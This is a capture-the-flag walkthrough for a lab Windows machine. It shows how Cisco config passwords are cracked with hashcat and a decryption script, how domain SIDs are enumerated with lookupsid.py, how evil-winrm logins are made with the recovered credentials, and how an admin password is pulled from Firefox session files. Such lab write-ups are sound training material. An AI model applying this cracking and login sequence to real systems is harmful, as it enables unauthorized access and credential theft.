```
Nmap Scan:

When you open port 80 you will get login page there you can login as guest also,
When you login through guest you will get config.txt where it contains encrypted password with privilage level.


http://www.ifm.net.nz/cookbooks/passwordcracker.html (password cracking website).


username admin privilege 15 password 7 02375012182C1A1D751618034F36415408 (Q4)sJu\Y8qz*A3?d)
username rout3r password 7 0242114B0E143F015F5D1E161713 ($uperP@ssword)

$1$pdQG$o8nrSzsGXeaduXrjlvKc91 : (stealth1agent) Decrypt using (https://raw.githubusercontent.com/sazoukis/Cisco-password-type5-decrypt/master/Cisco_type5_decrypt.py) | or you can use hashcat -m 500 hash /usr/share/wordlists/rockyou.txt --force (command to bruteforce).


Now the question is to find username.

https://gist.github.com/ankitsaini2609/21db05c7c64aa7eadb34a01756f17d56 (use this script to find username)

you will find it is hazard.

Now use 
lookupsid.py hazard:stealth1agent@10.10.10.149 (to enumerate sids)

[*] Domain SID is: S-1-5-21-4254423774-1266059056-3197185112
500: SUPPORTDESK\Administrator (SidTypeUser)
501: SUPPORTDESK\Guest (SidTypeUser)
503: SUPPORTDESK\DefaultAccount (SidTypeUser)
504: SUPPORTDESK\WDAGUtilityAccount (SidTypeUser)
513: SUPPORTDESK\None (SidTypeGroup)
1008: SUPPORTDESK\Hazard (SidTypeUser)
1009: SUPPORTDESK\support (SidTypeUser)
1012: SUPPORTDESK\Chase (SidTypeUser)
1013: SUPPORTDESK\Jason (SidTypeUser)

--------------------------------------------------------(User)
Administrator
support
Chase
Jason
Hazard
--------------------------------------------------------(Password)
Q4)sJu\Y8qz*A3?d Chase (Password)
$uperP@ssword
stealth1agent


evil-winrm -i 10.10.10.149 -u Chase -s '/opt/windows_Enumeration/' -e '/opt/windows_Enumeration/' (you will login as Chase)(Pasword:Q4)sJu\Y8qz*A3?d)

Go to Desktop  you will get user flag.

When you look into processes you will see firefox which is unusual so when you dig little bit about firefox you will get know aabout where it stores the sessions, when you open that file you will get the password. :) 
C:\Users\Chase\AppData\Roaming\Mozilla\Firefox\Profiles\77nc64t5.default\sessionstore-backups> cat previous.jsonlz4

admin@support.htb
4dD!5}x/re8]FBuZ ==> fortunately it is administrator password also.


evil-winrm -i 10.10.10.149 -u Administrator -s '/opt/windows_Enumeration/' -e '/opt/windows_Enumeration/'
(Password: 4dD!5}x/re8]FBuZ)

You will get the root.txt
```
